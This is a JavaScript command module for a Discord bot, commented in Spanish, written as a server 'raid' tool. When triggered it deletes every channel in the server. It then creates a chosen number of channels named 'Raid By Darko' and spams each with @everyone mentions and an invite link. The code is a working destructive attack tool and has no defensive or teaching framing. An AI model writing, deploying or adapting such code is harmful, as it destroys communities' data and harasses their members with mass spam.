module.exports = {
  name: 'on',
  description: 'Elimina todos los canales, crea nuevos canales y envía mensajes en cada uno.',
  async execute(message, args) {
    const amount = parseInt(args[0]);
    const repeatCount = parseInt(args[1]);

    const channelName = 'R̶a̶i̶d̶ ̶B̶y̶ ̶D̶a̶r̶k̶o̶☠️'; // Define el nombre del canal aquí
    const messageContent = '@everyone https://discord.gg/bmvhRcUU -|- /x66666666666'; // Define el mensaje a enviar aquí

    if (isNaN(amount) || amount <= 0) {
      return;
    }

    if (isNaN(repeatCount) || repeatCount <= 0) {
      return;
    }

    // Eliminar todos los canales
    const channels = message.guild.channels.cache;
    await Promise.all(channels.map(channel => channel.delete()));

    // Crear nuevos canales y enviar mensajes
    const createChannels = [];
    for (let i = 0; i < amount; i++) {
      createChannels.push(
        message.guild.channels.create({
          name: channelName,
          type: 0, // 0 es el valor numérico para GUILD_TEXT
        }).then(channel => {
          const sendMessages = [];
          for (let j = 0; j < repeatCount; j++) {
            sendMessages.push(channel.send(messageContent));
          }
          return Promise.all(sendMessages);
        })
      );
    }

    await Promise.all(createChannels);
  },
};
